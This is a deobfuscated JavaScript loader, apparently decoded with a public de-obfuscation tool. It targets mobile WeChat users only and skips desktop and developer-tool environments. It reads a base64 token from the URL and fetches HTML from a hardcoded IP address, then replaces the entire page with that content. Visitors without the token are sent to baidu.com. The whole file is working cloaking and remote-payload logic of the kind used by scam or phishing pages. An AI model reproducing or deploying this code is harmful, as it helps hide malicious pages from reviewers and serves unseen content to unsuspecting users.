//Thu Jul 25 2024 10:36:20 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
var ua = navigator.userAgent.toLowerCase(),
  isj = navigator.platform.toLowerCase();
function getLw() {
  var _0x3a26f3 = new RegExp("#", "g"),
    _0x1b44c5 = top.location.search + top.location.hash.replace(_0x3a26f3, "&"),
    _0x2db9b8 = new RegExp("(^|&|/?)lw=([^&#]*)(&|$|#)", "i"),
    _0x4007de = _0x1b44c5.substr(1).match(_0x2db9b8),
    _0x39c6f9;
  try {
    _0x39c6f9 = window.atob(_0x4007de[2]);
  } catch (_0x3461e2) {
    location.href = "http://www.baidu.com";
  }
  return _0x39c6f9.split(",");
}
if (isj.indexOf("win") < 0 && isj.indexOf("mac") < 0 && ua.indexOf("wxdebugger") < 0 && ua.indexOf("wechatdevtools") < 0 && ua.indexOf("windowswechat") < 0 && ua.match(/MicroMessenger/i) == "micromessenger") {
  var lw = getLw(),
    url = "http://106.53.192.46:8080/api/a/" + lw[1];
  function render() {
    html = Base64.decode(html.substr(3));
    var _0x308b20 = document.open("text/html", "replace");
    _0x308b20.write(html);
    _0x308b20.close();
    document.getElementById("loading").style.display = "none";
  }
  var html = null,
    xhr = new XMLHttpRequest();
  xhr.open("GET", url, false);
  xhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) html = xhr.responseText, render();else this.status == 404 && alert("网络异常！");
  };
  xhr.send();
}